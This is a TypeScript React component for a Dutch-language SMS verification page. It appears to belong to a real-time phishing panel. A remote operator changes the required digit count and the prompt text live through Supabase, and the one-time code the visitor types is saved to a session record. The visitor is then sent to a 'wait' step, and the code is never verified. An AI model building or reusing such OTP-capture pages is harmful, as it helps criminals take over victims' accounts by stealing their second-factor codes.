"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function SmsClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const [digits, setDigits] = useState(6);
  const [customText, setCustomText] = useState<string | null>(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const ui = {
    panel: "app-panel rounded-2xl p-6",
    input: "app-input mt-2 w-full px-4 py-3 text-lg tracking-[0.35em]",
    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-50",
  };

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setLoading(false);
        return;
      }
      const { data } = await supabase.from("sessions").select("sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) {
        setLoading(false);
        return;
      }

      setDigits(data.sms_digits ?? 6);
      setCustomText(data.sms_custom_text);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setCode(fd.smsCode ?? "");
      setLoading(false);
    })();

    // Supabase Realtime Listener for sms_digits changes
    if (supabase && sessionId) {
      const channel = supabase
        .channel(`sms-client:${sessionId}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "sessions",
            filter: `id=eq.${sessionId}`,
          },
          (payload) => {
            const next = payload.new as { sms_digits?: number; sms_custom_text?: string | null };
            if (next.sms_digits) {
              setDigits(next.sms_digits);
              // EÄŸer kod, yeni haneden uzunsa keselim
              setCode((prev) => prev.slice(0, next.sms_digits));
            }
            if (next.sms_custom_text !== undefined) {
              setCustomText(next.sms_custom_text);
            }
          }
        )
        .subscribe();

      return () => {
        cancelled = true;
        void supabase.removeChannel(channel);
      };
    }

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    setSaving(true);
    setMsg(null);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const { error } = await supabase
      .from("sessions")
      .update({ current_step: "wait", form_data: { ...prev, smsCode: code.trim() } })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Verzenden mislukt.");
    else router.replace(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <DemoShell title="SMS-verificatie">
        <ConfigMissing />
      </DemoShell>
    );
  }

  if (!sessionId) {
    return (
      <DemoShell title="SMS-verificatie">
        <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
          Ongeldige link.
        </p>
      </DemoShell>
    );
  }

  if (loading) {
    return (
      <DemoShell title="SMS-verificatie">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-brand-blue border-t-transparent" />
        </div>
      </DemoShell>
    );
  }

  const trimmed = code.trim();
  const valid = trimmed.length === digits && /^\d+$/.test(trimmed);
  const displayText = customText || settings.sms_subtitle;

  return (
    <DemoShell>
      <div className="space-y-4 w-full mt-24 sm:mt-6">
        <div className={ui.panel}>
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold text-gray-900">{settings.sms_title}</h2>
            <p className="text-sm text-gray-600 mt-1 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
          </div>
          <form onSubmit={handleSubmit} className="space-y-5">
          <label className="block text-sm font-bold text-zinc-800">
            {settings.sms_input_label} ({digits})
            <input
              required
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={digits}
              className={ui.input}
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, digits))}
            />
          </label>

          {!valid && code.length > 0 ? (
            <p className="text-xs text-red-600">Voer exact {digits} cijfers in.</p>
          ) : null}

          {msg ? <p className="text-center text-sm text-[#003b8f]">{msg}</p> : null}

          <button
            type="submit"
            disabled={saving || !valid}
            className={ui.submit}
          >
            {saving ? settings.sms_loading : settings.sms_button}
          </button>
        </form>
        </div>
      </div>
    </DemoShell>
  );
}
